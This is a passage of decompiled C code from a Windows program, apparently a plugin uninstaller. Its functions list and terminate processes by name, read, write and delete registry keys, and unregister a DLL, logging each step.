    puVar4 = (undefined4 *)((int)puVar4 + 1);
    param_1 = (undefined4 *)((int)param_1 + 1);
  }
  return 0;
}



undefined4 __thiscall FUN_00411c50(void *this,undefined4 *param_1)

{
  if (*(int *)((int)this + 4) == 0) {
    return 0x80004005;
  }
  *param_1 = *(undefined4 *)(*(int *)((int)this + 0xc) + 0x18 + *(int *)((int)this + 0x10) * 0x128);
  return 0;
}



undefined4 FUN_00411c80(DWORD param_1)

{
  HANDLE hProcess;
  
  hProcess = OpenProcess(1,0,param_1);
  if (hProcess != (HANDLE)0x0) {
    TerminateProcess(hProcess,0);
  }
  return 0;
}



undefined4 __thiscall FUN_00411cb0(void *this,byte *param_1,undefined4 *param_2)

{
  char cVar1;
  byte bVar2;
  bool bVar3;
  char *pcVar4;
  void *pvVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  undefined4 *puVar9;
  char *pcVar10;
  undefined4 *puVar11;
  byte *pbVar12;
  int local_404;
  undefined4 local_400 [256];
  
  iVar8 = 0;
  bVar3 = false;
  local_404 = 0;
  if (0 < *(int *)((int)this + 0x14)) {
    do {
      if (bVar3) break;
      pcVar4 = FUN_00415e60((char *)(*(int *)((int)this + 0xc) + 0x24 + iVar8),'\\');
      if (pcVar4 == (char *)0x0) {
        pcVar4 = (char *)(*(int *)((int)this + 0xc) + 0x24 + iVar8);
      }
      else {
        pcVar4 = pcVar4 + 1;
      }
      uVar6 = 0xffffffff;
      do {
        pcVar10 = pcVar4;
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        pcVar10 = pcVar4 + 1;
        cVar1 = *pcVar4;
        pcVar4 = pcVar10;
      } while (cVar1 != '\0');
      uVar6 = ~uVar6;
      puVar9 = (undefined4 *)(pcVar10 + -uVar6);
      puVar11 = local_400;
      for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {
        *puVar11 = *puVar9;
        puVar9 = puVar9 + 1;
        puVar11 = puVar11 + 1;
      }
      for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
        *(undefined *)puVar11 = *(undefined *)puVar9;
        puVar9 = (undefined4 *)((int)puVar9 + 1);
        puVar11 = (undefined4 *)((int)puVar11 + 1);
      }
      uVar6 = 0xffffffff;
      pbVar12 = param_1;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        bVar2 = *pbVar12;
        pbVar12 = pbVar12 + 1;
      } while (bVar2 != 0);
      if ((void *)(~uVar6 - 1) < (void *)0xd) {
        uVar6 = FUN_0041dd90((void *)(~uVar6 - 1),(byte *)local_400,param_1);
        if (uVar6 == 0) {
          *param_2 = *(undefined4 *)(*(int *)((int)this + 0xc) + 8 + iVar8);
          goto LAB_00411d7f;
        }
      }
      else {
        pvVar5 = FUN_0041de20((byte *)local_400,(char *)param_1,(void *)0xd);
        if (pvVar5 == (void *)0x0) {
          *param_2 = *(undefined4 *)(*(int *)((int)this + 0xc) + 8 + iVar8);
LAB_00411d7f:
          bVar3 = true;
        }
      }
      local_404 = local_404 + 1;
      iVar8 = iVar8 + 0x128;
    } while (local_404 < *(int *)((int)this + 0x14));
    if (bVar3) {
      return 0;
    }
  }
  return 0x80004005;
}



undefined4 __fastcall FUN_00411dd0(undefined4 *param_1)

{
  HANDLE hObject;
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  int iVar4;
  undefined4 *unaff_EDI;
  undefined4 *puVar5;
  undefined4 uStack_138;
  
  uStack_138 = 0;
  hObject = (HANDLE)CreateToolhelp32Snapshot();
  if (hObject != (HANDLE)0xffffffff) {
    iVar4 = 0;
    iVar1 = Process32First(hObject,&stack0xfffffed0);
    while (iVar1 != 0) {
      iVar4 = iVar4 + 1;
      iVar1 = Process32Next(hObject,&uStack_138);
    }
    param_1[5] = iVar4;
    puVar2 = (undefined4 *)FUN_00415216((uint *)(iVar4 * 0x128));
    param_1[3] = puVar2;
    for (uVar3 = (uint)(param_1[5] * 0x128) >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar2 = 0;
      puVar2 = puVar2 + 1;
    }
    for (iVar4 = 0; iVar4 != 0; iVar4 = iVar4 + -1) {
      *(undefined *)puVar2 = 0;
      puVar2 = (undefined4 *)((int)puVar2 + 1);
    }
    iVar4 = Process32First(hObject,&uStack_138);
    while (iVar4 != 0) {
      puVar2 = (undefined4 *)&stack0xfffffec0;
      puVar5 = unaff_EDI;
      for (iVar4 = 0x4a; iVar4 != 0; iVar4 = iVar4 + -1) {
        *puVar5 = *puVar2;
        puVar2 = puVar2 + 1;
        puVar5 = puVar5 + 1;
      }
      unaff_EDI = unaff_EDI + 0x4a;
      iVar4 = Process32Next(hObject,&stack0xfffffec0);
    }
    CloseHandle(hObject);
    *param_1 = 1;
    param_1[1] = 0;
    param_1[2] = 0;
    return 0;
  }
  return 0x80004005;
}



undefined4 __fastcall FUN_00411ec0(undefined4 *param_1)

{
  int iVar1;
  
  iVar1 = FUN_00411dd0(param_1);
  if (iVar1 == 0) {
    *param_1 = 1;
    param_1[2] = 0;
  }
  return 0;
}



int __thiscall FUN_00411ee0(void *this,byte *param_1)

{
  int iVar1;
  DWORD local_4;
  
  local_4 = 0;
  FUN_00411ec0((undefined4 *)this);
  iVar1 = FUN_00411cb0(this,param_1,&local_4);
  if (iVar1 == 0) {
    FUN_00411c80(local_4);
  }
  FUN_00411b20((undefined4 *)this);
  return iVar1;
}



int __thiscall FUN_00411f30(void *this,byte *param_1)

{
  char cVar1;
  byte bVar2;
  char *pcVar3;
  void *pvVar4;
  uint uVar5;
  uint uVar6;
  undefined4 *puVar7;
  char *pcVar8;
  undefined4 *puVar9;
  byte *pbVar10;
  int local_408;
  int local_404;
  undefined4 local_400 [256];
  
  local_404 = 0;
  local_408 = 0;
  FUN_00411ec0((undefined4 *)this);
  FUN_00411b50((int *)this);
  do {
    if (local_404 != 0) {
      FUN_00411b20((undefined4 *)this);
      return local_408;
    }
    FUN_00411c00(this,local_400);
    pcVar3 = FUN_00415e60((char *)local_400,'\\');
    if (pcVar3 != (char *)0x0) {
      uVar5 = 0xffffffff;
      pcVar3 = pcVar3 + 1;
      do {
        pcVar8 = pcVar3;
        if (uVar5 == 0) break;
        uVar5 = uVar5 - 1;
        pcVar8 = pcVar3 + 1;
        cVar1 = *pcVar3;
        pcVar3 = pcVar8;
      } while (cVar1 != '\0');
      uVar5 = ~uVar5;
      puVar7 = (undefined4 *)(pcVar8 + -uVar5);
      puVar9 = local_400;
      for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
        *puVar9 = *puVar7;
        puVar7 = puVar7 + 1;
        puVar9 = puVar9 + 1;
      }
      for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
        *(undefined *)puVar9 = *(undefined *)puVar7;
        puVar7 = (undefined4 *)((int)puVar7 + 1);
        puVar9 = (undefined4 *)((int)puVar9 + 1);
      }
    }
    uVar5 = 0xffffffff;
    pbVar10 = param_1;
    do {
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      bVar2 = *pbVar10;
      pbVar10 = pbVar10 + 1;
    } while (bVar2 != 0);
    if ((void *)(~uVar5 - 1) < (void *)0xd) {
      pvVar4 = (void *)FUN_0041dd90((void *)(~uVar5 - 1),(byte *)local_400,param_1);
    }
    else {
      pvVar4 = FUN_0041de20((byte *)local_400,(char *)param_1,(void *)0xd);
    }
    if (pvVar4 == (void *)0x0) {
      local_408 = local_408 + 1;
    }
    FUN_00411b80((int *)this);
    FUN_00411bc0(this,&local_404);
  } while( true );
}



void __thiscall FUN_00412030(void *this,undefined4 param_1)

{
  *(undefined ***)this = &PTR_FUN_004011dc;
  *(undefined4 *)((int)this + 4) = param_1;
  return;
}



undefined4 * __thiscall FUN_00412042(void *this,byte param_1)

{
  FUN_0041205e((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0041509e(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0041205e(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004011dc;
  return;
}



bool __thiscall FUN_00412065(void *this,HKEY param_1,LPCSTR param_2)

{
  LSTATUS LVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  char local_108 [256];
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  LVar1 = RegOpenKeyExA(param_1,param_2,0,0x20019,&local_8);
  if (LVar1 == 0) {
    RegCloseKey(local_8);
    FUN_0041546e(local_108,(byte *)s_Registry_key___s__exists__00406d9c);
    uVar2 = extraout_DL_00;
  }
  else {
    FUN_0041546e(local_108,(byte *)s_Registry_key___s__not_found__00406db8);
    uVar2 = extraout_DL;
  }
  FUN_004116e9(*(int *)((int)this + 4),uVar2,s_Registry_00406d84,s_Key_Exists_00406d90,local_108);
  return LVar1 == 0;
}



undefined4 __thiscall
FUN_004120ee(void *this,HKEY param_1,LPCSTR param_2,LPCSTR param_3,DWORD param_4,LPBYTE param_5)

{
  BYTE BVar1;
  char cVar2;
  DWORD DVar3;
  uint uVar4;
  uint uVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar6;
  undefined4 *extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 *extraout_EDX_02;
  undefined4 *extraout_EDX_03;
  LPBYTE pBVar8;
  undefined4 *puVar9;
  undefined4 uVar10;
  LPBYTE pBVar11;
  char *pcVar12;
  undefined4 *puVar13;
  char *pcVar14;
  CHAR local_210 [256];
  undefined4 local_110 [64];
  DWORD local_10;
  HKEY local_c;
  void *local_8;
  undefined4 *puVar7;
  
  local_c = (HKEY)0x0;
  local_8 = this;
  DVar3 = RegOpenKeyExA(param_1,param_2,0,0x20019,&local_c);
  pBVar8 = param_5;
  if (DVar3 != 0) {
    FormatMessageA(0x1000,(LPCVOID)0x0,DVar3,0,local_210,0x100,(va_list *)0x0);
    FUN_0041546e((char *)local_110,(byte *)s_Error_opening_path___s__for_read_004070a4);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Read_Value_00407098,
                 local_110);
    return 0xffffffff;
  }
  param_1 = (HKEY)param_4;
  local_10 = 1;
  DVar3 = RegQueryValueExA(local_c,param_3,(LPDWORD)0x0,&local_10,param_5,(LPDWORD)&param_1);
  if (DVar3 != 0) {
    FormatMessageA(0x1000,(LPCVOID)0x0,DVar3,0,local_210,0x100,(va_list *)0x0);
    FUN_0041546e((char *)local_110,(byte *)s_Error_reading_key___s__s___syste_00407068);
    uVar10 = 0xfffffffe;
    uVar6 = extraout_DL_00;
    goto LAB_00412362;
  }
  switch(local_10) {
  case 0:
    pcVar14 = s_Registry_Key___s__s__Type__None_S_00406e84;
    break;
  case 1:
    pcVar14 = s_Registry_Key___s__s__Type__Strin_00406e08;
    goto LAB_00412334;
  case 2:
    pcVar14 = s_Registry_Key___s__s__Type__Unexp_00406f54;
    goto LAB_00412334;
  case 3:
    pcVar14 = s_Registry_Key___s__s__Type__Binar_00407030;
    goto LAB_00412334;
  case 4:
    pcVar14 = s_Registry_Key___s__s__Type__Doubl_00406fe4;
LAB_00412334:
    FUN_0041546e((char *)local_110,(byte *)pcVar14);
    puVar7 = extraout_EDX_02;
    goto LAB_00412360;
  case 5:
    FUN_0041546e((char *)local_110,(byte *)s_Registry_Key___s__s__Type__Doubl_00406f98);
    FUN_004116e9(*(int *)((int)local_8 + 4),extraout_DL_01,s_Registry_00406d84,s_Read_Value_00407098
                 ,local_110);
    puVar7 = extraout_EDX;
    goto LAB_00412360;
  case 6:
    pcVar14 = s_Registry_Key___s__s__Type__Symbo_00406f20;
    break;
  case 7:
    FUN_0041546e((char *)local_110,(byte *)s_Registry_Key___s__s__Type__Array_00406ee8);
    uVar10 = extraout_EDX_00;
    while( true ) {
      if (*pBVar8 == '\0') break;
      FUN_004116e9(*(int *)((int)local_8 + 4),(char)uVar10,s_Registry_00406d84,s_Read_Value_00407098
                   ,local_110);
      FUN_0041546e((char *)local_110,(byte *)s__Value____s__00406ed8);
      uVar4 = 0xffffffff;
      pBVar11 = pBVar8;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        BVar1 = *pBVar11;
        pBVar11 = pBVar11 + 1;
      } while (BVar1 != '\0');
      pBVar8 = pBVar8 + (~uVar4 - 1);
      uVar10 = extraout_EDX_01;
    }
    FUN_004116e9(*(int *)((int)local_8 + 4),(char)uVar10,s_Registry_00406d84,s_Read_Value_00407098,
                 local_110);
    uVar4 = 0xffffffff;
    puVar7 = local_110;
    pcVar14 = s_Registry_Key___s__s__End_of_reg_v_00406eb0;
    do {
      pcVar12 = pcVar14;
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      pcVar12 = pcVar14 + 1;
      cVar2 = *pcVar14;
      pcVar14 = pcVar12;
    } while (cVar2 != '\0');
    uVar4 = ~uVar4;
    puVar9 = (undefined4 *)(pcVar12 + -uVar4);
    puVar13 = puVar7;
    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
      *puVar13 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar13 = puVar13 + 1;
    }
    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
      *(undefined *)puVar13 = *(undefined *)puVar9;
      puVar9 = (undefined4 *)((int)puVar9 + 1);
      puVar13 = (undefined4 *)((int)puVar13 + 1);
    }
    goto LAB_00412360;
  case 8:
    pcVar14 = s_Registry_Key___s__s__Type__Devic_00406e40;
    break;
  default:
    pcVar14 = s_Registry_Key___s__s__Type__Undef_00406dd8;
  }
  FUN_0041546e((char *)local_110,(byte *)pcVar14);
  puVar7 = extraout_EDX_03;
LAB_00412360:
  uVar6 = SUB41(puVar7,0);
  uVar10 = 0;
LAB_00412362:
  FUN_004116e9(*(int *)((int)local_8 + 4),uVar6,s_Registry_00406d84,s_Read_Value_00407098,local_110)
  ;
  RegCloseKey(local_c);
  return uVar10;
}



undefined4 __thiscall
FUN_004123b0(void *this,HKEY param_1,LPCSTR param_2,LPCSTR param_3,LPBYTE param_4)

{
  DWORD DVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined4 uVar2;
  char local_20c [256];
  CHAR local_10c [256];
  DWORD local_c;
  HKEY local_8;
  
  uVar2 = 0;
  local_8 = (HKEY)0x0;
  DVar1 = RegOpenKeyExA(param_1,param_2,0,0x20019,&local_8);
  if (DVar1 == 0) {
    param_1 = (HKEY)0x4;
    DVar1 = RegQueryValueExA(local_8,param_3,(LPDWORD)0x0,&local_c,param_4,(LPDWORD)&param_1);
    if (DVar1 != 0) {
      FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0,local_10c,0x100,(va_list *)0x0);
      FUN_0041546e(local_20c,(byte *)s_Error_reading_key___s__s____s_004070cc);
      FUN_004116e9(*(int *)((int)this + 4),extraout_DL_00,s_Registry_00406d84,
                   s_Read_DWORD_Value_004070ec,local_20c);
      uVar2 = 0xfffffffe;
    }
    RegCloseKey(local_8);
  }
  else {
    FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0,local_10c,0x100,(va_list *)0x0);
    FUN_0041546e(local_20c,(byte *)s_Error_opening_path___s__for_read_004070a4);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Read_DWORD_Value_004070ec
                 ,local_20c);
    uVar2 = 0xffffffff;
  }
  return uVar2;
}



undefined4 __thiscall
FUN_004124c2(void *this,HKEY param_1,LPCSTR param_2,LPCSTR param_3,BYTE *param_4)

{
  BYTE BVar1;
  DWORD DVar2;
  uint uVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar4;
  undefined4 uVar5;
  BYTE *pBVar6;
  CHAR local_20c [256];
  char local_10c [256];
  void *local_c;
  HKEY local_8;
  
  uVar5 = 0;
  local_8 = (HKEY)0x0;
  local_c = this;
  DVar2 = RegOpenKeyExA(param_1,param_2,0,0xf003f,&local_8);
  if (DVar2 == 0) {
    uVar3 = 0xffffffff;
    pBVar6 = param_4;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      BVar1 = *pBVar6;
      pBVar6 = pBVar6 + 1;
    } while (BVar1 != '\0');
    DVar2 = RegSetValueExA(local_8,param_3,0,1,param_4,~uVar3 - 1);
    if (DVar2 == 0) {
      FUN_0041546e(local_10c,(byte *)s_Registry_Key___s__s__new_value_i_00407100);
      uVar4 = extraout_DL_01;
    }
    else {
      FormatMessageA(0x1000,(LPCVOID)0x0,DVar2,0,local_20c,0x100,(va_list *)0x0);
      FUN_0041546e(local_10c,(byte *)s_Error_writing_the_new_value___s__0040712c);
      uVar5 = 0xfffffffe;
      uVar4 = extraout_DL_00;
    }
    FUN_004116e9(*(int *)((int)local_c + 4),uVar4,s_Registry_00406d84,s_Write_Value_00407160,
                 local_10c);
    RegCloseKey(local_8);
  }
  else {
    FormatMessageA(0x1000,(LPCVOID)0x0,DVar2,0,local_20c,0x100,(va_list *)0x0);
    FUN_0041546e(local_10c,(byte *)s_Error_opening_path___s__for_writ_0040716c);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Write_Value_00407160,
                 local_10c);
    uVar5 = 0xffffffff;
  }
  return uVar5;
}



undefined4 __thiscall
FUN_004125fb(void *this,HKEY param_1,LPCSTR param_2,LPCSTR param_3,undefined4 param_4)

{
  DWORD DVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar2;
  undefined4 uVar3;
  CHAR local_208 [256];
  char local_108 [256];
  HKEY local_8;
  
  uVar3 = 0;
  local_8 = (HKEY)0x0;
  DVar1 = RegOpenKeyExA(param_1,param_2,0,0xf003f,&local_8);
  if (DVar1 == 0) {
    DVar1 = RegSetValueExA(local_8,param_3,0,4,(BYTE *)&param_4,4);
    if (DVar1 == 0) {
      FUN_0041546e(local_108,(byte *)s_Registry_Key___s__s__new_value_i_00407194);
      uVar2 = extraout_DL_01;
    }
    else {
      FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0,local_208,0x100,(va_list *)0x0);
      FUN_0041546e(local_108,(byte *)s_Error_writing_the_new_value__d_t_004071bc);
      uVar3 = 0xfffffffe;
      uVar2 = extraout_DL_00;
    }
    FUN_004116e9(*(int *)((int)this + 4),uVar2,s_Registry_00406d84,s_Write_DWORD_Value_004071f0,
                 local_108);
    RegCloseKey(local_8);
  }
  else {
    FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0,local_208,0x100,(va_list *)0x0);
    FUN_0041546e(local_108,(byte *)s_Error_opening_path___s__for_writ_0040716c);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,
                 s_Write_DWORD_Value_004071f0,local_108);
    uVar3 = 0xffffffff;
  }
  return uVar3;
}



undefined4 __thiscall FUN_00412722(void *this,HKEY param_1,LPCSTR param_2,LPCSTR param_3)

{
  DWORD DVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar2;
  undefined4 uVar3;
  CHAR local_208 [256];
  char local_108 [256];
  HKEY local_8;
  
  uVar3 = 0;
  local_8 = (HKEY)0x0;
  DVar1 = RegOpenKeyExA(param_1,param_2,0,0xf003f,&local_8);
  if (DVar1 == 0) {
    DVar1 = RegDeleteValueA(local_8,param_3);
    if (DVar1 == 0) {
      FUN_0041546e(local_108,(byte *)s_Registry_key___s__s__DELETED__00407204);
      uVar2 = extraout_DL_01;
    }
    else {
      FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0,local_208,0x100,(va_list *)0x0);
      FUN_0041546e(local_108,(byte *)s_Registry_value___s__s__NOT_delet_00407224);
      uVar3 = 0xfffffffe;
      uVar2 = extraout_DL_00;
    }
    FUN_004116e9(*(int *)((int)this + 4),uVar2,s_Registry_00406d84,s_Delete_Value_0040724c,local_108
                );
    RegCloseKey(local_8);
  }
  else {
    FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0,local_208,0x100,(va_list *)0x0);
    FUN_0041546e(local_108,(byte *)s_Error_opening_path___s__for_key_d_0040725c);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Delete_Value_0040724c,
                 local_108);
    uVar3 = 0xffffffff;
  }
  return uVar3;
}



undefined4 __thiscall FUN_0041283a(void *this,HKEY param_1,LPCSTR param_2)

{
  DWORD dwMessageId;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar1;
  undefined4 uVar2;
  CHAR local_204 [256];
  char local_104 [256];
  
  dwMessageId = RegDeleteKeyA(param_1,param_2);
  uVar2 = 0;
  if (dwMessageId == 0) {
    FUN_0041546e(local_104,(byte *)s_Registry_path___s__DELETED__00407298);
    uVar1 = extraout_DL_00;
  }
  else {
    FormatMessageA(0x1000,(LPCVOID)0x0,dwMessageId,0,local_204,0x100,(va_list *)0x0);
    FUN_0041546e(local_104,(byte *)s_Registry_path__s__NOT_deleted____004072b8);
    uVar2 = 0xffffffff;
    uVar1 = extraout_DL;
  }
  FUN_004116e9(*(int *)((int)this + 4),uVar1,s_Registry_00406d84,s_Delete_Key_0040728c,local_104);
  return uVar2;
}



undefined4 FUN_004128cf(int param_1,HKEY param_2,LPCSTR param_3)

{
  LSTATUS LVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar2;
  undefined4 uVar3;
  char local_104 [256];
  
  FUN_0041546e(local_104,(byte *)s_Attempting_to_delete_the_key___s_0040733c);
  FUN_004116e9(param_1,extraout_DL,s_Registry_00406d84,s_DeleteEntireRegistryKey_00407324,local_104)
  ;
  LVar1 = SHDeleteKeyA(param_2,param_3);
  if (LVar1 == 0) {
    FUN_0041546e(local_104,(byte *)s_Successfully_deleted_the_key___s_004072dc);
    uVar3 = 0;
    uVar2 = extraout_DL_01;
  }
  else {
    FUN_0041546e(local_104,(byte *)s_ERROR_failed_deleting_the_key____00407300);
    uVar3 = 0xffffffff;
    uVar2 = extraout_DL_00;
  }
  FUN_004116e9(param_1,uVar2,s_Registry_00406d84,s_DeleteEntireRegistryKey_00407324,local_104);
  return uVar3;
}



undefined4 __thiscall FUN_00412966(void *this,HKEY param_1,LPCSTR param_2)

{
  undefined4 uVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  CHAR local_208 [256];
  char local_108 [256];
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  param_1 = (HKEY)RegCreateKeyExA(param_1,param_2,0,(LPSTR)0x0,0,0xf003f,(LPSECURITY_ATTRIBUTES)0x0,
                                  &local_8,(LPDWORD)&param_1);
  if (param_1 == (HKEY)0x0) {
    FUN_0041546e(local_108,(byte *)s_Registry_path___s__created__00407360);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL_00,s_Registry_00406d84,s_Create_Key_00407380,
                 local_108);
    RegCloseKey(local_8);
    uVar1 = 0;
  }
  else {
    FormatMessageA(0x1000,(LPCVOID)0x0,(DWORD)param_1,0,local_208,0x100,(va_list *)0x0);
    FUN_0041546e(local_108,(byte *)s_Registry_path__s__NOT_created____0040738c);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Create_Key_00407380,
                 local_108);
    uVar1 = 0xffffffff;
  }
  return uVar1;
}



undefined4 __thiscall
FUN_00412a34(void *this,HKEY param_1,LPCSTR param_2,DWORD param_3,LPSTR param_4,DWORD param_5)

{
  LSTATUS LVar1;
  DWORD dwMessageId;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar2;
  char *pcVar3;
  CHAR local_20c [256];
  char local_10c [256];
  undefined4 local_c;
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  local_c = 0xffffffff;
  LVar1 = RegOpenKeyExA(param_1,param_2,0,0x20019,&local_8);
  if (LVar1 == 0) {
    FUN_0041546e(local_10c,(byte *)s_Analysing_subkey_index__d_004073e0);
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Enumerate_Key_004073fc,
                 local_10c);
    dwMessageId = RegEnumKeyA(local_8,param_3,param_4,param_5);
    RegCloseKey(local_8);
    if (dwMessageId != 0) {
      FormatMessageA(0x1000,(LPCVOID)0x0,dwMessageId,0,local_20c,0x100,(va_list *)0x0);
      FUN_0041546e(local_10c,(byte *)s_Error_finding_subkey__004073c8);
      uVar2 = extraout_DL_00;
      goto LAB_00412b15;
    }
    local_c = 0;
    pcVar3 = s_Found_the_subkey___s___004073b0;
  }
  else {
    pcVar3 = s_Registry_key___s__not_found__00406db8;
  }
  FUN_0041546e(local_10c,(byte *)pcVar3);
  uVar2 = extraout_DL_01;
LAB_00412b15:
  FUN_004116e9(*(int *)((int)this + 4),uVar2,s_Registry_00406d84,s_Enumerate_Key_004073fc,local_10c)
  ;
  return local_c;
}



undefined4 __thiscall FUN_00412b30(void *this,LPCSTR param_1)

{
  HRESULT HVar1;
  HMODULE hModule;
  DWORD dwMessageId;
  FARPROC pFVar2;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined4 uVar4;
  char local_104 [256];
  
  HVar1 = OleInitialize((LPVOID)0x0);
  if (HVar1 < 0) {
    FUN_004116e9(*(int *)((int)this + 4),extraout_DL,s_Registry_00406d84,s_Unregister_DLL_004074b0,
                 s_Error_initializing_OLE__00407428);
    uVar4 = 1;
  }
  else {
    SetErrorMode(1);
    hModule = LoadLibraryExA(param_1,(HANDLE)0x0,8);
    if (hModule < (HMODULE)0x20) {
      dwMessageId = GetLastError();
      FUN_0041546e(local_104,(byte *)s_Error__d_loading_DLL___s___0040740c);
      FUN_004116e9(*(int *)((int)this + 4),extraout_DL_00,s_Registry_00406d84,
                   s_Unregister_DLL_004074b0,local_104);
      FormatMessageA(0x1000,(LPCVOID)0x0,dwMessageId,0,local_104,0x100,(va_list *)0x0);
      FUN_004116e9(*(int *)((int)this + 4),extraout_DL_01,s_Registry_00406d84,
                   s_Unregister_DLL_004074b0,local_104);
      uVar4 = 2;
    }
    else {
      pFVar2 = GetProcAddress(hModule,s_DllUnregisterServer_0040749c);
      if (pFVar2 == (FARPROC)0x0) {
        FUN_0041546e(local_104,(byte *)s_Error_finding_DllUnregisterServe_00407464);
        FUN_004116e9(*(int *)((int)this + 4),extraout_DL_02,s_Registry_00406d84,
                     s_Unregister_DLL_004074b0,local_104);
        uVar4 = 3;
      }
      else {
        iVar3 = (*pFVar2)();
        if (iVar3 < 0) {
          FUN_0041546e(local_104,(byte *)s_Error__d_unregistering___s___00407444);
          FUN_004116e9(*(int *)((int)this + 4),extraout_DL_03,s_Registry_00406d84,
                       s_Unregister_DLL_004074b0,local_104);
          uVar4 = 4;
        }
        else {
          uVar4 = 0;
        }
      }
      FreeLibrary(hModule);
    }
    OleUninitialize();
  }
  return uVar4;
}



void FUN_00412c8c(void)

{
  int iVar1;
  bool bVar2;
  undefined3 extraout_var;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  int unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  char *pcVar4;
  
  FUN_004165b0();
  iVar1 = *(int *)(unaff_EBP + 8);
  FUN_00412030((void *)(unaff_EBP + -0x14),iVar1);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_0041546e((char *)(unaff_EBP + -0x514),(byte *)s__s__s__s_004053b4);
  FUN_0041546e((char *)(unaff_EBP + -0x114),(byte *)s_Attempting_to_unregister__s__00407550);
  FUN_004116e9(iVar1,extraout_DL,s_Uninstall_00407528,s_Remove_Plugin_Directories_00407534,
               unaff_EBP + -0x114);
  bVar2 = FUN_00413399(iVar1,(LPCSTR)(unaff_EBP + -0x514));
  if (CONCAT31(extraout_var,bVar2) != 0) {
    iVar3 = FUN_00412b30((void *)(unaff_EBP + -0x14),(LPCSTR)(unaff_EBP + -0x514));
    if (iVar3 == 0) {
      pcVar4 = s_Successfully_unregistered__s__004074e4;
    }
    else {
      pcVar4 = s_Error__Could_not_unregister__s__00407504;
    }
    FUN_0041546e((char *)(unaff_EBP + -0x114),(byte *)pcVar4);
    FUN_004116e9(iVar1,extraout_DL_00,s_Uninstall_00407528,s_Remove_Plugin_Directories_00407534,
                 unaff_EBP + -0x114);
  }
  FUN_00415d42((uint *)(unaff_EBP + -0x914),(uint *)0x400);
  FUN_0041546e((char *)(unaff_EBP + -0x114),(byte *)s_Current_working_directory_is__s__004074c0);
  FUN_004116e9(iVar1,extraout_DL_01,s_Uninstall_00407528,s_Remove_Plugin_Directories_00407534,
               unaff_EBP + -0x114);
  FUN_0041546e((char *)(unaff_EBP + -0x514),(byte *)s__s__s_0040460c);
  iVar3 = FUN_004132f2(iVar1,(LPCSTR)(unaff_EBP + -0x514));
  if (iVar3 != 0) {
    FUN_00413ea3(iVar1,(LPCSTR)(unaff_EBP + -0x514));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  *unaff_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return;
}



void FUN_00412ded(void)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined extraout_DL;
  int unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  
  FUN_004165b0();
  FUN_00412030((void *)(unaff_EBP + -0x14),*(undefined4 *)(unaff_EBP + 8));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  *(undefined4 *)(unaff_EBP + -0x18) = 0;
